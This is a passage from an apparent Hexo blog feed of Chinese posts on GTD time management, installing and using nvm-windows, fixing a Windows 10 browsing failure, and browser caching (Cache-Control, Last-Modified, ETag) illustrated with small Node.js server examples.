<td></td>
</tr>
</tbody></table>
<p>表格横向（row）是以事项为主体的 GTD 执行步骤；而纵向（col）才是以执行者，也就是以你为主体的执行步骤。</p>
<p>事项未收集，不用操之过急的执行事情。</p>
<p>从这份表格中，当你横向看着进行回顾的时候，纵向的明晰、组织、执行都是一套流程走完。</p>
<h2 id="4-回收箱和参考资料"><a href="#4-回收箱和参考资料" class="headerlink" title="4 回收箱和参考资料"></a>4 回收箱和参考资料</h2><h3 id="4-1-回收箱"><a href="#4-1-回收箱" class="headerlink" title="4.1 回收箱"></a>4.1 回收箱</h3><p>看一下回收箱，跟 win 系统桌面的垃圾箱一样。什么样的情况，我们会把事情扔进回收箱。原因如下：</p>
<ul>
<li>一件事本身会变化</li>
<li>参考 GTD 的两个目的</li>
</ul>
<h3 id="4-2-参考资料"><a href="#4-2-参考资料" class="headerlink" title="4.2 参考资料"></a>4.2 参考资料</h3><p>一切可被记录的，就可被参考；参考价值的高低是相对的。</p>
<p>从语言到文字再到电子设备多样化的更加丰富的载体，可作为参考资料。</p>
<h4 id="4-2-1-如何准备参考资料"><a href="#4-2-1-如何准备参考资料" class="headerlink" title="4.2.1 如何准备参考资料"></a>4.2.1 如何准备参考资料</h4><ol>
<li>回归常识，避免追奇、怪</li>
<li>提高信息的检索、辨别能力</li>
<li>提高参考资料的存档标准<ul>
<li>搜索引擎能够找到的、浅显平常的，不存档</li>
<li>新概念，但换汤不换药的，不存档</li>
</ul>
</li>
</ol>
<p>人找书很难，但书找书却很容易。通过了解一本书，进而了解与之相关的书。把事情简化为最基本的事实，大道至简。</p>
<h4 id="4-2-2-现代人的参考资料"><a href="#4-2-2-现代人的参考资料" class="headerlink" title="4.2.2 现代人的参考资料"></a>4.2.2 现代人的参考资料</h4><ol>
<li><p>网络搜索引擎</p>
</li>
<li><p>个人知识库</p>
<p>可以是书架上的笔记，存储盘、网络云盘</p>
<ul>
<li>见阶段工作所需参考资料</li>
<li>智慧、或对智慧的见解。如值得纪念、留存、回味、学习的。</li>
</ul>
</li>
</ol>
<h2 id="5-如何选择适合你的-GTD-工具"><a href="#5-如何选择适合你的-GTD-工具" class="headerlink" title="5 如何选择适合你的 GTD 工具"></a>5 如何选择适合你的 GTD 工具</h2><p>很显然，这是一个多变的世界，不可能有专门为你量身定做的应用，为你所想。</p>
<h3 id="5-1-常见应用"><a href="#5-1-常见应用" class="headerlink" title="5.1 常见应用"></a>5.1 常见应用</h3><ul>
<li>Evernote</li>
<li>OneNote</li>
<li>Outlook</li>
<li>IOS 提醒事项</li>
<li>OmniFocus</li>
<li>Things</li>
<li>Trello</li>
<li>Wunderlist&#x2F;Microsoft To-Do</li>
</ul>
<h3 id="5-2-应用选择原则"><a href="#5-2-应用选择原则" class="headerlink" title="5.2 应用选择原则"></a>5.2 应用选择原则</h3><ol>
<li>没有 100%契合任何人的应用，放弃一劳永逸</li>
<li>计量参考官方推荐，总有其道理</li>
<li>考虑迁移成本、是否放弃成本。如时间上的消耗。</li>
<li>考虑你的硬件设备，全平台不一定好</li>
<li>给自己足够的时间试错应用</li>
<li>不是软件帮你做什么，而是你如何使用软件。如它是否限制了你的功能使用。</li>
<li>便利 ≠ 高效，不要舍本逐末，除”机心“</li>
<li>GTD 不一定必须使用某一款应用，也不一定要使用应用</li>
</ol>
<p>如何科学地认识和使用 GTD 时间管理法则，这篇文章就到此结束了。但关于 GTD 的深入实践，我们乐在其中。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.bilibili.com/video/BV1wE411176Q?p=1">Topbook-GTD 自我管理、时间管理教程</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>GTD</tag>
        <tag>管理</tag>
      </tags>
  </entry>
  <entry>
    <title>node版本管理</title>
    <url>/2022/03/17/20220317-node%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="了解-nvm-windows"><a href="#了解-nvm-windows" class="headerlink" title="了解 nvm-windows"></a>了解 nvm-windows</h2><p><a href="https://docs.microsoft.com/en-us/windows/nodejs/setup-on-windows">Microsoft</a> &#x2F; <a href="https://docs.npmjs.com/cli/v7/configuring-npm/install#windows-node-version-managers">npm &#x2F;Google 为</a><em>Windows</em>推荐 了 Node.js 版本管理器。<em>原始<a href="https://github.com/nvm-sh/nvm">nvm</a>是一个完全独立的项目，仅适用于 Mac&#x2F;Linux。</em>该项目使用完全不同的理念，而不仅仅是 nvm 的克隆。详细信息列在<a href="https://github.com/coreybutler/nvm-windows#bulb-why-another-version-manager">为什么另一个版本管理器？</a>有<a href="https://github.com/coreybutler/nvm-windows#bulb-whats-the-big-difference">什么大的区别？</a>。</p>
<h2 id="安装-nvm-windows"><a href="#安装-nvm-windows" class="headerlink" title="安装 nvm-windows"></a>安装 nvm-windows</h2><h3 id="卸载任何预先存在的节点安装"><a href="#卸载任何预先存在的节点安装" class="headerlink" title="卸载任何预先存在的节点安装"></a>卸载任何预先存在的节点安装</h3><p>在安装 NVM for Windows 之前卸载任何现有的 Node.js 版本（否则你会有冲突的版本）。<code>%ProgramFiles%\nodejs</code>删除任何可能保留的现有 Node.js 安装目录。（有的用户可能自定义路径了，找到 自己的 Node.js 安装目录，删除即可）</p>
<h3 id="备份任何全局npmrc配置"><a href="#备份任何全局npmrc配置" class="headerlink" title="备份任何全局npmrc配置"></a>备份任何全局<code>npmrc</code>配置</h3><p>例如<code>%AppData%\npm\etc\npmrc</code>。或者，将设置复制到用户 config <code>%UserProfile%\.npmrc</code>。删除现有的 npm 安装位置（例如<code>%AppData%\npm</code>）以防止全局模块冲突。</p>
<h3 id="最后安装"><a href="#最后安装" class="headerlink" title="最后安装"></a>最后安装</h3><ol>
<li><a href="https://github.com/coreybutler/nvm-windows/releases">下载安装包</a>，选择 nvm-setup.zip，下载并解压自己想存放的文件路径。</li>
<li>双击 nvm-setup.exe，进入安装界面，选择 nvm-windows 的安装路径，这里我给的是<code>E:\AppData\Roaming\nvm</code>（可以不用提前创建好文件路径）。</li>
<li>点击下一步，是存放 nodejs 的路径，这里我给的是<code>E:\DevTools\nodejs</code>（<strong>必须提前创建好文件路径</strong>，否则，后面 <code>nvm use &lt;version&gt;</code>时出现 exit status 错误）。</li>
<li>下一步， install 等待安装完成即可。</li>
</ol>
<blockquote>
<p>! 注意</p>
<p>安装 nvm-windows 时，选择存放 nodejs 的路径时，必须提前创建好想要存放它的路径，这里跟以往我们安装其他应用不一样，可能是 nvm-windows 的开发者忽略了这一点，“选择文件路径的同时会自动出创建对应的文件路径”。</p>
<p>对于选择存放 nodejs 的路径，是否可以如默认的一样<code>C:\Program Files\nodejs</code>，该路径名含有空格，可以尝试一下，后面<code>nvm use &lt;version&gt;</code>时，是否会报错提示 exit status 及乱码。</p>
<p>因为安装 nvm-windows 的同时，它会根据你所选的 2 个路径（一个是 nvm， 一个是 nodejs），默认配置好环境变量（包含用户环境变量和系统环境变量），所以，选择 nodejs 的有空格的路径时，是没有问题的，<strong>关键是必须提前创建好 nodejs 对应的存放路径</strong>。</p>
</blockquote>
<h2 id="nvm-用法"><a href="#nvm-用法" class="headerlink" title="nvm 用法"></a>nvm 用法</h2><p>NVM for Windows 是一个命令行工具。只需<code>nvm</code>在控制台中输入帮助即可。基本命令是：</p>
<ul>
<li>**<code>nvm arch [32|64]</code>**：显示节点是在 32 位还是 64 位模式下运行。指定 32 或 64 以覆盖默认架构。</li>
<li>**<code>nvm current</code>**：显示活动版本。</li>
<li>**<code>nvm install &lt;version&gt; [arch]</code>**：版本可以是特定版本，“latest”表示最新的当前版本，或“lts”表示最新的 LTS 版本。可选地指定是安装 32 位还是 64 位版本（默认为系统架构）。将 [arch] 设置为“all”以安装 32 位和 64 位版本。添加<code>--insecure</code>到此命令的末尾以绕过远程下载服务器的 SSL 验证。</li>
<li>**<code>nvm list [available]</code>**：列出 node.js 安装。在末尾键入<code>available</code>以显示可供下载的版本列表。</li>
<li><strong><code>nvm on</code></strong>: 启用 node.js 版本管理。</li>
<li>**<code>nvm off</code>**：禁用 node.js 版本管理（不卸载任何东西）。</li>
<li>**<code>nvm proxy [url]</code>**：设置用于下载的代理。留空<code>[url]</code>以查看当前代理。设置<code>[url]</code>为“无”以删除代理。</li>
<li>**<code>nvm uninstall &lt;version&gt;</code>**：卸载特定版本。</li>
<li>**<code>nvm use &lt;version&gt; [arch]</code>*<em>：切换到使用指定的版本。可选择使用<code>latest</code>,<code>lts</code>或<code>newest</code>. <code>newest</code>是最新</em>安装*的版本。可选择指定 32&#x2F;64 位架构。<code>nvm use &lt;arch&gt;</code>将继续使用所选版本，但切换到 32&#x2F;64 位模式。有关<code>use</code>在特定目录中使用（或使用<code>.nvmrc</code>）的信息，请参阅<a href="https://github.com/coreybutler/nvm-windows/issues/16">问题 #16</a>。</li>
<li><strong><code>nvm root &lt;path&gt;</code></strong>: 设置 nvm 应该存放不同版本的 node.js 的目录。如果<code>&lt;path&gt;</code>未设置，将显示当前根目录。</li>
<li>**<code>nvm version</code>**：显示当前运行的 NVM for Windows 版本。</li>
<li>**<code>nvm node_mirror &lt;node_mirror_url&gt;</code>*<em>：设置节点镜像。国内的人可以使用</em><a href="https://npmmirror.com/mirrors/node/">https://npmmirror.com/mirrors/node/</a>*</li>
<li>**<code>nvm npm_mirror &lt;npm_mirror_url&gt;</code>*<em>：设置 npm 镜像。中国的人可以使用</em><a href="https://npmmirror.com/mirrors/npm/">https://npmmirror.com/mirrors/npm/</a>*</li>
</ul>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>如果在使用<code>nvm use &lt;version&gt;</code>时，出现报错提示，“exit status 乱码”，那就得问问自己，nodejs 的真实存放路径是否有提前创建好；执行<code>nvm use &lt;version&gt;</code>的命令环境是否通过管理员权限打开的。另外，网友给出， nodejs 存放路径包含空格或中文了。总之，你们尽可一一尝试，改正即可。</p>
<p>最后，如果打开 vscode 的命令行，输入 nvm、node、npm 等对应命令，是无效的，这时，重启电脑，命令即可生效，而不是重启 vscode。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://github.com/coreybutler/nvm-windows">适用于 Windows 的 NVM</a></p>
<p>[2] <a href="https://www.runoob.com/w3cnote/nvm-manager-node-versions.html">使用 nvm 管理不同版本的 node 与 npm</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>win10网络正常但网页访问失败</title>
    <url>/2022/03/23/20220323-win10%E7%BD%91%E7%BB%9C%E6%AD%A3%E5%B8%B8%E4%BD%86%E7%BD%91%E9%A1%B5%E8%AE%BF%E9%97%AE%E5%A4%B1%E8%B4%A5/</url>
    <content><![CDATA[<h2 id="issues"><a href="#issues" class="headerlink" title="issues"></a>issues</h2><p>电脑网络通过网线，WIFI，手机热点都显示正常，访问各种浏览器中的网页，都失败。</p>
<blockquote>
<p>Windows 10 专业工作站版</p>
</blockquote>
<h2 id="已解决"><a href="#已解决" class="headerlink" title="已解决"></a>已解决</h2><p>控制面板-网络和 Internet</p>
<p>选择 管理浏览器加载项 - 高级 - 重置</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://blog.csdn.net/qq_39187959/article/details/109897929">解决电脑网络正常但是打不开网页</a></p>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>win10</tag>
      </tags>
  </entry>
  <entry>
    <title>从输入URL开始建立前端知识体系</title>
    <url>/2022/03/25/20220325-%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%BC%80%E5%A7%8B%E5%BB%BA%E7%AB%8B%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB/</url>
    <content><![CDATA[<p>看到这个，不借助搜索引擎，自己的心里是否有一个答案？对于某些执着于技术的大佬，大概会有一些回答吧：（猜的） - 从键盘谈起到系统交互，从浏览器到CPU，从调度机制到系统内核，从数据请求到二进制、汇编，从GPU绘图到LCD显示，然后再分析系统底层的进程、内存等等。总之，从软件到硬件，到材料，到分子，原子，量子，薛定谔的猫，人类起源，宇宙大爆炸，平行宇宙？感觉都毫无违和感。</p>
<span id="more"></span>

<div class="note info"><p>文章转载自<a href="https://juejin.cn/post/6935232082482298911">FinGet</a> </p>
</div>

<h2 id="前置内容-浏览器主要进程"><a href="#前置内容-浏览器主要进程" class="headerlink" title="前置内容 浏览器主要进程"></a>前置内容 浏览器主要进程</h2><p>浏览器是多进程的，主要分为：</p>
<ul>
<li>浏览器主进程：只有一个，主要控制页面的创建、销毁、网络资源管理、下载等。</li>
<li>第三方插件进程：每一种类型的插件对应一个进程，仅当使用该插件时才创建。</li>
<li>GPU 进程：最多一个，用于 3D 绘制等。</li>
<li>浏览器渲染进程(浏览器内核)：每个 Tab 页对应一个进程，互不影响。</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6bc05b033f444b4198f0ce6084cc7b52~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h2 id="第一部分-输入网址并解析"><a href="#第一部分-输入网址并解析" class="headerlink" title="第一部分 输入网址并解析"></a>第一部分 输入网址并解析</h2><p>这里我们只考虑输入的是一个 URL 结构字符串，如果是非 URL 结构的字符串，则会用浏览器默认的搜索引擎搜索该字符串。</p>
<h3 id="URL-的组成"><a href="#URL-的组成" class="headerlink" title="URL 的组成"></a>URL 的组成</h3><p>URL 主要由 <code>协议</code>、<code>主机</code>、<code>端口</code>、<code>路径</code>、<code>查询参数</code>、<code>锚点</code>6 部分组成！</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/035928222c2b4baa8e6089f307d06dfd~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h3 id="解析-URL"><a href="#解析-URL" class="headerlink" title="解析 URL"></a>解析 URL</h3><p>输入 URL 后，浏览器会解析出协议、主机、端口、路径等信息，并构造一个 HTTP 请求。</p>
<ol>
<li>浏览器发送请求前，根据请求头的<code>expires</code>和<code>cache-control</code>判断是否命中（包括是否过期）强缓存策略，如果命中，直接从缓存获取资源，并不会发送请求。如果没有命中，则进入下一步。</li>
<li>没有命中强缓存规则，浏览器会发送请求，根据请求头的<code>If-Modified-Since</code>和<code>If-None-Match</code>判断是否命中协商缓存，如果命中，直接从缓存获取资源。如果没有命中，则进入下一步。</li>
<li>如果前两步都没有命中，则直接从服务端获取资源。</li>
</ol>
<h4 id="HSTS"><a href="#HSTS" class="headerlink" title="HSTS"></a>HSTS</h4><p>由于安全隐患，会使用 HSTS 强制客户端使用 HTTPS 访问页面。详见：<a href="https://link.juejin.cn/?target=https://www.barretlee.com/blog/2015/10/22/hsts-intro/">你所不知道的 HSTS</a>。 当你的网站均采用 HTTPS，并符合它的安全规范，就可以申请加入 HSTS 列表，之后用户不加 HTTPS 协议再去访问你的网站，浏览器都会定向到 HTTPS。无论匹配到没有，都要开始 DNS 查询工作了。</p>
<h3 id="浏览器缓存"><a href="#浏览器缓存" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h3><h4 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h4><p>强制缓存就是向浏览器缓存查找该请求结果，并根据该结果的缓存规则来决定是否使用该缓存结果的过程。强缓存又分为两种<code>Expires</code>和<code>Cache-Control</code></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b0f5e26bfdb749e6a9e339dfac224fe1~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h5 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h5><ul>
<li>版本：HTTP&#x2F;1.0</li>
<li>来源：存在于服务端返回的响应头中</li>
<li>语法：Expires: Wed, 22 Nov 2019 08:41:00 GMT</li>
<li>缺点：服务器的时间和浏览器的时间可能并不一致导致失效</li>
</ul>
<h5 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h5><ul>
<li>版本：HTTP&#x2F;1.1</li>
<li>来源：响应头和请求头</li>
<li>语法：Cache-Control:max-age&#x3D;3600</li>
<li>缺点：时间最终还是会失效</li>
</ul>
<p>请求头：</p>
<table>
<thead>
<tr>
<th>字段名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>no-cache</td>
<td>告知(代理)服务器不直接使用缓存，要求向原服务器发起请求</td>
</tr>
<tr>
<td>no-store</td>
<td>所有内容都不会被保存到缓存或 Internet 临时文件中</td>
</tr>
<tr>
<td>max-age&#x3D;delta-seconds</td>
<td>告知服务器客户端希望接收一个存在时间不大于 delta-secconds 秒的资源</td>
</tr>
<tr>
<td>max-stale[&#x3D;delta-seconds]</td>
<td>告知(代理)服务器客户端愿意接收一个超过缓存时间的资源，若有定义 delta-seconds 则为 delta-seconds 秒，若没有则为任意超出时间</td>
</tr>
<tr>
<td>min-fresh&#x3D;delta-seconds</td>
<td>告知(代理)服务器客户端希望接收一个在小于 delta-seconds 秒内被更新过的资源</td>
</tr>
<tr>
<td>no-transform</td>
<td>告知(代理)服务器客户端希望获取实体数据没有被转换(比如压缩)过的资源</td>
</tr>
<tr>
<td>noly-if-cached</td>
<td>告知(代理)服务器客户端希望获取缓存的内容(若有),而不用向原服务器发去请求</td>
</tr>
<tr>
<td>cache-extension</td>
<td>自定义扩展值，若服务器不识别该值将被忽略掉</td>
</tr>
</tbody></table>
<p>响应头：</p>
<table>
<thead>
<tr>
<th>字段名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>表明任何情况下都得缓存该资源(即使是需要 HTTP 认证的资源)</td>
</tr>
<tr>
<td>Private&#x3D;[field-name]</td>
<td>表明返回报文中全部或部分(若指定了 field-name 则为 field-name 的字段数据)仅开放给某些用户(服务器指定的 share-user，如代理服务器)做缓存使用，其他用户则不能缓存这些数据</td>
</tr>
<tr>
<td>no-cache</td>
<td>不直接使用缓存，要求向服务器发起(新鲜度校验)请求</td>
</tr>
<tr>
<td>no-store</td>
<td>所以内容都不会被保存到缓存或 Internet 临时文件中</td>
</tr>
<tr>
<td>no-transform</td>
<td>告知客户端缓存文件时不得对实体数据做任何改变</td>
</tr>
<tr>
<td>noly-if-cached</td>
<td>告知(代理)服务器客户端希望获取缓存的内容(若有),而不用向原服务器发去请求</td>
</tr>
<tr>
<td>must-revalidate</td>
<td>当前资源一定是向原方法服务器发去验证请求的，如请求是吧会返回 504(而非代理服务器上的缓存)</td>
</tr>
<tr>
<td>proxy-revalidate</td>
<td>与 must-revalidate 类似，但仅能应用于共享缓存(如代理)</td>
</tr>
<tr>
<td>max-age&#x3D;delta-seconds</td>
<td>告知客户端该资源在 delta-seconds 秒内是新鲜的，无需向服务器发请求</td>
</tr>
<tr>
<td>s-maxage&#x3D;delta-seconds</td>
<td>同 max-age，但仅能应用于共享缓存(如代理)</td>
</tr>
<tr>
<td>cache-extension</td>
<td>自定义扩展值，若服务器不识别该值将被忽略掉</td>
</tr>
</tbody></table>
<p>示例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server.js</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="keyword">function</span> (<span class="params">request, response</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;request come&#x27;</span>, request.<span class="property">url</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (request.<span class="property">url</span> === <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> html = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;test.html&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    response.<span class="title function_">end</span>(html)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (request.<span class="property">url</span> === <span class="string">&#x27;/script.js&#x27;</span>) &#123;</span><br><span class="line">    response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/javascript&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=20,public&#x27;</span> <span class="comment">// 缓存20s 多个值用逗号分开</span></span><br><span class="line">    &#125;)</span><br><span class="line">    response.<span class="title function_">end</span>(<span class="string">&#x27;console.log(&quot;script loaded&quot;)&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;server listening on 8888&#x27;</span>)</span><br><span class="line">复制代码</span><br><span class="line"><span class="comment">// test.html</span></span><br><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">  &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script src=&quot;/script.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/gDDrIrc.png" alt="img"></p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a234f77d63574343b1c9128261d67503~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="image.png"></p>
<h4 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h4><p>协商缓存就是强制缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存的过程。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3ba010a1229f477b93e3432e5e8be509~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h5 id="模拟-Last-Modified"><a href="#模拟-Last-Modified" class="headerlink" title="模拟 Last-Modified"></a>模拟 Last-Modified</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (request.<span class="property">url</span> === <span class="string">&#x27;/index.js&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, request.<span class="property">url</span>) <span class="comment">// 拼接当前脚本文件地址</span></span><br><span class="line">  <span class="keyword">const</span> stat = fs.<span class="title function_">statSync</span>(filePath) <span class="comment">// 获取当前脚本状态</span></span><br><span class="line">  <span class="keyword">const</span> mtime = stat.<span class="property">mtime</span>.<span class="title function_">toGMTString</span>() <span class="comment">// 文件的最后修改时间</span></span><br><span class="line">  <span class="keyword">const</span> requestMtime = request.<span class="property">headers</span>[<span class="string">&#x27;if-modified-since&#x27;</span>] <span class="comment">// 来自浏览器传递的值</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(stat)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(mtime, requestMtime)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 走协商缓存</span></span><br><span class="line">  <span class="keyword">if</span> (mtime === requestMtime) &#123;</span><br><span class="line">    response.<span class="property">statusCode</span> = <span class="number">304</span></span><br><span class="line">    response.<span class="title function_">end</span>()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 协商缓存失效，重新读取数据设置 Last-Modified 响应头</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;协商缓存 Last-Modified 失效&#x27;</span>)</span><br><span class="line">  response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/javascript&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Last-Modified&#x27;</span>: mtime</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> readStream = fs.<span class="title function_">createReadStream</span>(filePath)</span><br><span class="line">  readStream.<span class="title function_">pipe</span>(response)</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bc44f282fdb04c7793293885bfed8309~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="image.png"></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1be9fb406e1544f3a9c5676d91be15a8~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/40165c39fb75499db999177b9a07e353~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h5 id="模拟-ETag"><a href="#模拟-ETag" class="headerlink" title="模拟 ETag"></a>模拟 ETag</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (request.<span class="property">url</span> === <span class="string">&#x27;/index.js&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, request.<span class="property">url</span>) <span class="comment">// 拼接当前脚本文件地址</span></span><br><span class="line">  <span class="keyword">const</span> buffer = fs.<span class="title function_">readFileSync</span>(filePath) <span class="comment">// 获取当前脚本状态</span></span><br><span class="line">  <span class="keyword">const</span> fileMd5 = <span class="title function_">md5</span>(buffer) <span class="comment">// 文件的 md5 值</span></span><br><span class="line">  <span class="keyword">const</span> noneMatch = request.<span class="property">headers</span>[<span class="string">&#x27;if-none-match&#x27;</span>] <span class="comment">// 来自浏览器端传递的值</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (noneMatch === fileMd5) &#123;</span><br><span class="line">    response.<span class="property">statusCode</span> = <span class="number">304</span></span><br><span class="line">    response.<span class="title function_">end</span>()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Etag 缓存失效&#x27;</span>)</span><br><span class="line">  response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/javascript&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="title class_">ETag</span>: fileMd5</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> readStream = fs.<span class="title function_">createReadStream</span>(filePath)</span><br><span class="line">  readStream.<span class="title function_">pipe</span>(response)</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ecb493eaed974d3e860313f18c02f827~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="image.png"></p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1a450c5d8d98428daa677df1f1ce689d~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="image.png"></p>
<h5 id="Last-Modified-响应头-，If-Modified-Since-请求头"><a href="#Last-Modified-响应头-，If-Modified-Since-请求头" class="headerlink" title="Last-Modified(响应头)，If-Modified-Since(请求头)"></a>Last-Modified(响应头)，If-Modified-Since(请求头)</h5><p>在浏览器第一次给服务器发送请求后，服务器会在响应头中加上这个字段。 浏览器接收到后，如果再次请求，会在请求头中携带<code>If-Modified-Since</code>字段，这个字段的值也就是服务器传来的最后修改时间。 服务器拿到请求头中的<code>If-Modified-Since</code>的字段后，其实会和这个服务器中该资源的最后修改时间<code>Last-Modified</code>对比,询问服务器在该日期后资源是否有更新，有更新的话就会将新的资源发送回来。</p>
<p>但是如果在本地打开缓存文件，就会造成 <code>Last-Modified</code> 被修改，所以在 <code>HTTP / 1.1</code> 出现了 <code>ETag</code>。</p>
